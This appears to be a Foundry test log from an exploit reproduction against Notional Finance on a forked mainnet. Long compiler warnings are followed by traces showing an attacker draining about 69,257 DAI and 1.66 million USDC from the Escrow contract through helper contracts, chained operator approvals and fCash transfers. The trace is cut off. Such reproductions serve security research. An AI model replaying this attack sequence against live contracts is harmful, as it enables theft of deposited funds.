@@ -1,0 +1,855 @@
+Compiling 23 files with Solc 0.8.35
+Solc 0.8.35 finished in 445.17ms
+Compiler run successful with warnings:
+Warning (8429): Virtual modifiers are deprecated and scheduled for removal.
+  --> basetest.sol:87:5:
+   |
+87 |     modifier balanceLog() virtual {
+   |     ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (8429): Virtual modifiers are deprecated and scheduled for removal.
+   --> basetest.sol:103:5:
+    |
+103 |     modifier balanceLog2(address target) virtual {
+    |     ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1241:9:
+     |
+1241 |         string calldata error
+     |         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1255:9:
+     |
+1255 |         string calldata error
+     |         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1263:79:
+     |
+1263 |     function assertApproxEqAbs(uint256 left, uint256 right, uint256 maxDelta, string calldata error) external pure;
+     |                                                                               ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1270:77:
+     |
+1270 |     function assertApproxEqAbs(int256 left, int256 right, uint256 maxDelta, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1287:9:
+     |
+1287 |         string calldata error
+     |         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1305:9:
+     |
+1305 |         string calldata error
+     |         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1315:86:
+     |
+1315 |     function assertApproxEqRel(uint256 left, uint256 right, uint256 maxPercentDelta, string calldata error)
+     |                                                                                      ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1326:84:
+     |
+1326 |     function assertApproxEqRel(int256 left, int256 right, uint256 maxPercentDelta, string calldata error)
+     |                                                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1335:77:
+     |
+1335 |     function assertEqDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1342:75:
+     |
+1342 |     function assertEqDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1348:46:
+     |
+1348 |     function assertEq(bool left, bool right, string calldata error) external pure;
+     |                                              ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1354:68:
+     |
+1354 |     function assertEq(string calldata left, string calldata right, string calldata error) external pure;
+     |                                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1360:66:
+     |
+1360 |     function assertEq(bytes calldata left, bytes calldata right, string calldata error) external pure;
+     |                                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1366:68:
+     |
+1366 |     function assertEq(bool[] calldata left, bool[] calldata right, string calldata error) external pure;
+     |                                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1372:74:
+     |
+1372 |     function assertEq(uint256[] calldata left, uint256[] calldata right, string calldata error) external pure;
+     |                                                                          ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1378:72:
+     |
+1378 |     function assertEq(int256[] calldata left, int256[] calldata right, string calldata error) external pure;
+     |                                                                        ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1387:74:
+     |
+1387 |     function assertEq(address[] calldata left, address[] calldata right, string calldata error) external pure;
+     |                                                                          ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1393:74:
+     |
+1393 |     function assertEq(bytes32[] calldata left, bytes32[] calldata right, string calldata error) external pure;
+     |                                                                          ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1399:72:
+     |
+1399 |     function assertEq(string[] calldata left, string[] calldata right, string calldata error) external pure;
+     |                                                                        ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1405:70:
+     |
+1405 |     function assertEq(bytes[] calldata left, bytes[] calldata right, string calldata error) external pure;
+     |                                                                      ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1408:52:
+     |
+1408 |     function assertEq(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1414:50:
+     |
+1414 |     function assertEq(int256 left, int256 right, string calldata error) external pure;
+     |                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1420:52:
+     |
+1420 |     function assertEq(address left, address right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1426:52:
+     |
+1426 |     function assertEq(bytes32 left, bytes32 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1432:42:
+     |
+1432 |     function assertFalse(bool condition, string calldata error) external pure;
+     |                                          ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1440:77:
+     |
+1440 |     function assertGeDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1448:75:
+     |
+1448 |     function assertGeDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1455:52:
+     |
+1455 |     function assertGe(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1462:50:
+     |
+1462 |     function assertGe(int256 left, int256 right, string calldata error) external pure;
+     |                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1470:77:
+     |
+1470 |     function assertGtDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1478:75:
+     |
+1478 |     function assertGtDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1485:52:
+     |
+1485 |     function assertGt(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1492:50:
+     |
+1492 |     function assertGt(int256 left, int256 right, string calldata error) external pure;
+     |                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1500:77:
+     |
+1500 |     function assertLeDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1508:75:
+     |
+1508 |     function assertLeDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1515:52:
+     |
+1515 |     function assertLe(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1522:50:
+     |
+1522 |     function assertLe(int256 left, int256 right, string calldata error) external pure;
+     |                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1530:77:
+     |
+1530 |     function assertLtDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1538:75:
+     |
+1538 |     function assertLtDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1545:52:
+     |
+1545 |     function assertLt(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1552:50:
+     |
+1552 |     function assertLt(int256 left, int256 right, string calldata error) external pure;
+     |                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1559:80:
+     |
+1559 |     function assertNotEqDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                                ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1566:78:
+     |
+1566 |     function assertNotEqDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                              ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1572:49:
+     |
+1572 |     function assertNotEq(bool left, bool right, string calldata error) external pure;
+     |                                                 ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1578:71:
+     |
+1578 |     function assertNotEq(string calldata left, string calldata right, string calldata error) external pure;
+     |                                                                       ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1584:69:
+     |
+1584 |     function assertNotEq(bytes calldata left, bytes calldata right, string calldata error) external pure;
+     |                                                                     ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1590:71:
+     |
+1590 |     function assertNotEq(bool[] calldata left, bool[] calldata right, string calldata error) external pure;
+     |                                                                       ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1596:77:
+     |
+1596 |     function assertNotEq(uint256[] calldata left, uint256[] calldata right, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1602:75:
+     |
+1602 |     function assertNotEq(int256[] calldata left, int256[] calldata right, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1611:77:
+     |
+1611 |     function assertNotEq(address[] calldata left, address[] calldata right, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1617:77:
+     |
+1617 |     function assertNotEq(bytes32[] calldata left, bytes32[] calldata right, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1623:75:
+     |
+1623 |     function assertNotEq(string[] calldata left, string[] calldata right, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1629:73:
+     |
+1629 |     function assertNotEq(bytes[] calldata left, bytes[] calldata right, string calldata error) external pure;
+     |                                                                         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1632:55:
+     |
+1632 |     function assertNotEq(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                       ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1638:53:
+     |
+1638 |     function assertNotEq(int256 left, int256 right, string calldata error) external pure;
+     |                                                     ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1644:55:
+     |
+1644 |     function assertNotEq(address left, address right, string calldata error) external pure;
+     |                                                       ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1650:55:
+     |
+1650 |     function assertNotEq(bytes32 left, bytes32 right, string calldata error) external pure;
+     |                                                       ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1656:41:
+     |
+1656 |     function assertTrue(bool condition, string calldata error) external pure;
+     |                                         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (4591): There are more than 256 warnings. Ignoring the rest.
+
+Ran 1 test for test/NotionalFinance_exp.sol:NotionalFinanceExp
+[PASS] testExploit() (gas: 5217735)
+Logs:
+  === Before exploit ===
+   DAI Balance: 0.000000000000000000
+   USDC Balance: 0.000000
+  attacker DAI gain: 69257.372677950923155658
+  attacker USDC gain: 1658524.864122
+  === After exploit ===
+   DAI Balance: 69257.372677950923155658
+   USDC Balance: 1658524.864122
+
+Traces:
+  [95010] NotionalFinanceExp::setUp()
+    ├─ [0] VM::createSelectFork("<rpc url>", 25900219 [2.59e7])
+    │   └─ ← [Return] 1
+    ├─ [0] VM::label(AttackerEOA: [0xDaCC235a494750193695A111D715c2ca12b5Ce38], "AttackerEOA")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Notional1155: [0xBbA899578bd3fA3DAa863A340f5600797993eF08], "Notional1155")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Escrow: [0x9abd0b8868546105F6F48298eaDC1D9c82f7f683], "Escrow")
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [5386535] NotionalFinanceExp::testExploit()
+    ├─ [0] VM::deal(AttackerEOA: [0xDaCC235a494750193695A111D715c2ca12b5Ce38], 0)
+    │   └─ ← [Return]
+    ├─ emit log_string(val: "=== Before exploit ===")
+    ├─ [672] 0x6B175474E89094C44Da98b954EedeAC495271d0F::symbol() [staticcall]
+    │   └─ ← [Return] "DAI"
+    ├─ [2602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(AttackerEOA: [0xDaCC235a494750193695A111D715c2ca12b5Ce38]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [240] 0x6B175474E89094C44Da98b954EedeAC495271d0F::decimals() [staticcall]
+    │   └─ ← [Return] 18
+    ├─ emit log_named_decimal_uint(key: " DAI Balance", val: 0, decimals: 18)
+    ├─ [10370] FiatTokenProxy::fallback() [staticcall]
+    │   ├─ [3081] FiatTokenV2_2::symbol() [delegatecall]
+    │   │   └─ ← [Return] "USDC"
+    │   └─ ← [Return] "USDC"
+    ├─ [3339] FiatTokenProxy::fallback(AttackerEOA: [0xDaCC235a494750193695A111D715c2ca12b5Ce38]) [staticcall]
+    │   ├─ [2553] FiatTokenV2_2::balanceOf(AttackerEOA: [0xDaCC235a494750193695A111D715c2ca12b5Ce38]) [delegatecall]
+    │   │   └─ ← [Return] 0
+    │   └─ ← [Return] 0
+    ├─ [3164] FiatTokenProxy::fallback() [staticcall]
+    │   ├─ [2381] FiatTokenV2_2::decimals() [delegatecall]
+    │   │   └─ ← [Return] 6
+    │   └─ ← [Return] 6
+    ├─ emit log_named_decimal_uint(key: " USDC Balance", val: 0, decimals: 6)
+    ├─ [602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(AttackerEOA: [0xDaCC235a494750193695A111D715c2ca12b5Ce38]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [1339] FiatTokenProxy::fallback(AttackerEOA: [0xDaCC235a494750193695A111D715c2ca12b5Ce38]) [staticcall]
+    │   ├─ [553] FiatTokenV2_2::balanceOf(AttackerEOA: [0xDaCC235a494750193695A111D715c2ca12b5Ce38]) [delegatecall]
+    │   │   └─ ← [Return] 0
+    │   └─ ← [Return] 0
+    ├─ [2602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(Escrow: [0x9abd0b8868546105F6F48298eaDC1D9c82f7f683]) [staticcall]
+    │   └─ ← [Return] 69257372677950923155658 [6.925e22]
+    ├─ [3339] FiatTokenProxy::fallback(Escrow: [0x9abd0b8868546105F6F48298eaDC1D9c82f7f683]) [staticcall]
+    │   ├─ [2553] FiatTokenV2_2::balanceOf(Escrow: [0x9abd0b8868546105F6F48298eaDC1D9c82f7f683]) [delegatecall]
+    │   │   └─ ← [Return] 1658524864122 [1.658e12]
+    │   └─ ← [Return] 1658524864122 [1.658e12]
+    ├─ [0] VM::startPrank(AttackerEOA: [0xDaCC235a494750193695A111D715c2ca12b5Ce38], AttackerEOA: [0xDaCC235a494750193695A111D715c2ca12b5Ce38])
+    │   └─ ← [Return]
+    ├─ [0] VM::warp(1788479927 [1.788e9])
+    │   └─ ← [Return]
+    ├─ [1922024] → new NotionalExploit@0xEc434A2f9B7b93AAD1beD77d6Bc512A75aE90d78
+    │   └─ ← [Return] 9600 bytes of code
+    ├─ [3060083] NotionalExploit::setup()
+    │   ├─ [488855] → new NotionalHelper@0x5872B67d58CeF954B52dEb8E97f9F614BB12fa3d
+    │   │   └─ ← [Return] 2439 bytes of code
+    │   ├─ [488855] → new NotionalHelper@0x84A060Ed81316E6741Af216A099cFea8bCDd3489
+    │   │   └─ ← [Return] 2439 bytes of code
+    │   ├─ [488855] → new NotionalHelper@0x265ccfF3673bCAb03867988081cd51bFd919C03C
+    │   │   └─ ← [Return] 2439 bytes of code
+    │   ├─ [488855] → new NotionalHelper@0x4a3508C5aC0677325932f3bC786Ae7A1C3e9CAfF
+    │   │   └─ ← [Return] 2439 bytes of code
+    │   ├─ [35381] NotionalHelper::approveOperator(NotionalExploit: [0xEc434A2f9B7b93AAD1beD77d6Bc512A75aE90d78])
+    │   │   ├─ [31753] Notional1155::setApprovalForAll(NotionalExploit: [0xEc434A2f9B7b93AAD1beD77d6Bc512A75aE90d78], true)
+    │   │   │   ├─ [24534] 0x6F10251649c3d0b545506a5F374B63CcDf18cEaf::setApprovalForAll(NotionalExploit: [0xEc434A2f9B7b93AAD1beD77d6Bc512A75aE90d78], true) [delegatecall]
+    │   │   │   │   ├─ emit ApprovalForAll(account: NotionalHelper: [0x5872B67d58CeF954B52dEb8E97f9F614BB12fa3d], operator: NotionalExploit: [0xEc434A2f9B7b93AAD1beD77d6Bc512A75aE90d78], approved: true)
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xd7a67425365dc46be8830a0d30be11fe1f8c330d37bfcfba17b67c62e2b31f73: 0 → 1
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   └─ ← [Return]
+    │   │   └─ ← [Stop]
+    │   ├─ [26381] NotionalHelper::approveOperator(NotionalExploit: [0xEc434A2f9B7b93AAD1beD77d6Bc512A75aE90d78])
+    │   │   ├─ [25253] Notional1155::setApprovalForAll(NotionalExploit: [0xEc434A2f9B7b93AAD1beD77d6Bc512A75aE90d78], true)
+    │   │   │   ├─ [24534] 0x6F10251649c3d0b545506a5F374B63CcDf18cEaf::setApprovalForAll(NotionalExploit: [0xEc434A2f9B7b93AAD1beD77d6Bc512A75aE90d78], true) [delegatecall]
+    │   │   │   │   ├─ emit ApprovalForAll(account: NotionalHelper: [0x84A060Ed81316E6741Af216A099cFea8bCDd3489], operator: NotionalExploit: [0xEc434A2f9B7b93AAD1beD77d6Bc512A75aE90d78], approved: true)
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x03400c088b28ece7053c907e190aa39390dc6faa587f1b1ad198d6b5f0f34504: 0 → 1
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   └─ ← [Return]
+    │   │   └─ ← [Stop]
+    │   ├─ [26381] NotionalHelper::approveOperator(NotionalHelper: [0x84A060Ed81316E6741Af216A099cFea8bCDd3489])
+    │   │   ├─ [25253] Notional1155::setApprovalForAll(NotionalHelper: [0x84A060Ed81316E6741Af216A099cFea8bCDd3489], true)
+    │   │   │   ├─ [24534] 0x6F10251649c3d0b545506a5F374B63CcDf18cEaf::setApprovalForAll(NotionalHelper: [0x84A060Ed81316E6741Af216A099cFea8bCDd3489], true) [delegatecall]
+    │   │   │   │   ├─ emit ApprovalForAll(account: NotionalHelper: [0x265ccfF3673bCAb03867988081cd51bFd919C03C], operator: NotionalHelper: [0x84A060Ed81316E6741Af216A099cFea8bCDd3489], approved: true)
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xc53b129aa39a787439475e685beba659657c9bc190f2b831a8acda8370556293: 0 → 1
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   └─ ← [Return]
+    │   │   └─ ← [Stop]
+    │   ├─ [26381] NotionalHelper::approveOperator(NotionalHelper: [0x84A060Ed81316E6741Af216A099cFea8bCDd3489])
+    │   │   ├─ [25253] Notional1155::setApprovalForAll(NotionalHelper: [0x84A060Ed81316E6741Af216A099cFea8bCDd3489], true)
+    │   │   │   ├─ [24534] 0x6F10251649c3d0b545506a5F374B63CcDf18cEaf::setApprovalForAll(NotionalHelper: [0x84A060Ed81316E6741Af216A099cFea8bCDd3489], true) [delegatecall]
+    │   │   │   │   ├─ emit ApprovalForAll(account: NotionalHelper: [0x4a3508C5aC0677325932f3bC786Ae7A1C3e9CAfF], operator: NotionalHelper: [0x84A060Ed81316E6741Af216A099cFea8bCDd3489], approved: true)
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xb429a3828cc746136c7deb443cd9ae8468269fdf867b13836df09dcef0d17a68: 0 → 1
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   └─ ← [Return]
+    │   │   └─ ← [Stop]
+    │   ├─ [11022] 0xfabCDD7c1C3F7b892De64B2B52C4b786c4436Dba::getActiveMaturities() [staticcall]
+    │   │   ├─ [3805] 0x307885bb78D490cF9198D678F8B2D1058D741F93::getActiveMaturities() [delegatecall]
+    │   │   │   └─ ← [Return] [1788480000 [1.788e9], 1796256000 [1.796e9]]
+    │   │   └─ ← [Return] [1788480000 [1.788e9], 1796256000 [1.796e9]]
+    │   ├─ [602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(Escrow: [0x9abd0b8868546105F6F48298eaDC1D9c82f7f683]) [staticcall]
+    │   │   └─ ← [Return] 69257372677950923155658 [6.925e22]
+    │   ├─ [1339] FiatTokenProxy::fallback(Escrow: [0x9abd0b8868546105F6F48298eaDC1D9c82f7f683]) [staticcall]
+    │   │   ├─ [553] FiatTokenV2_2::balanceOf(Escrow: [0x9abd0b8868546105F6F48298eaDC1D9c82f7f683]) [delegatecall]
+    │   │   │   └─ ← [Return] 1658524864122 [1.658e12]
+    │   │   └─ ← [Return] 1658524864122 [1.658e12]
+    │   ├─ [2016] Notional1155::encodeAssetId(2, 0, 1788480000 [1.788e9], 0xa8) [staticcall]
+    │   │   ├─ [1314] 0x6F10251649c3d0b545506a5F374B63CcDf18cEaf::encodeAssetId(2, 0, 1788480000 [1.788e9], 0xa8) [delegatecall]
+    │   │   │   └─ ← [Return] 144115645926736040 [1.441e17]
+    │   │   └─ ← [Return] 144115645926736040 [1.441e17]
+    │   ├─ [2016] Notional1155::encodeAssetId(2, 0, 1796256000 [1.796e9], 0xa8) [staticcall]
+    │   │   ├─ [1314] 0x6F10251649c3d0b545506a5F374B63CcDf18cEaf::encodeAssetId(2, 0, 1796256000 [1.796e9], 0xa8) [delegatecall]
+    │   │   │   └─ ← [Return] 144115647917392040 [1.441e17]
+    │   │   └─ ← [Return] 144115647917392040 [1.441e17]
+    │   ├─ [2016] Notional1155::encodeAssetId(3, 0, 1788480000 [1.788e9], 0xa8) [staticcall]
+    │   │   ├─ [1314] 0x6F10251649c3d0b545506a5F374B63CcDf18cEaf::encodeAssetId(3, 0, 1788480000 [1.788e9], 0xa8) [delegatecall]
+    │   │   │   └─ ← [Return] 216173239964663976 [2.161e17]
+    │   │   └─ ← [Return] 216173239964663976 [2.161e17]
+    │   ├─ [211124] Notional1155::safeTransferFrom(NotionalExploit: [0xEc434A2f9B7b93AAD1beD77d6Bc512A75aE90d78], NotionalHelper: [0x5872B67d58CeF954B52dEb8E97f9F614BB12fa3d], 144115645926736040 [1.441e17], 1, 0x)
+    │   │   ├─ [210381] 0x6F10251649c3d0b545506a5F374B63CcDf18cEaf::safeTransferFrom(NotionalExploit: [0xEc434A2f9B7b93AAD1beD77d6Bc512A75aE90d78], NotionalHelper: [0x5872B67d58CeF954B52dEb8E97f9F614BB12fa3d], 144115645926736040 [1.441e17], 1, 0x) [delegatecall]
+    │   │   │   ├─ [198399] 0x0A4721117040ABF319b954aBF13F654505C34920::mintfCashPair(NotionalExploit: [0xEc434A2f9B7b93AAD1beD77d6Bc512A75aE90d78], NotionalHelper: [0x5872B67d58CeF954B52dEb8E97f9F614BB12fa3d], 2, 1788480000 [1.788e9], 1)
+    │   │   │   │   ├─ [191194] Portfolios::mintfCashPair(NotionalExploit: [0xEc434A2f9B7b93AAD1beD77d6Bc512A75aE90d78], NotionalHelper: [0x5872B67d58CeF954B52dEb8E97f9F614BB12fa3d], 2, 1788480000 [1.788e9], 1) [delegatecall]
+    │   │   │   │   │   ├─ [20029] Escrow::fallback(NotionalExploit: [0xEc434A2f9B7b93AAD1beD77d6Bc512A75aE90d78]) [staticcall]
+    │   │   │   │   │   │   ├─ [12786] Escrow::getBalances(NotionalExploit: [0xEc434A2f9B7b93AAD1beD77d6Bc512A75aE90d78]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] [0, 0, 0, 0]
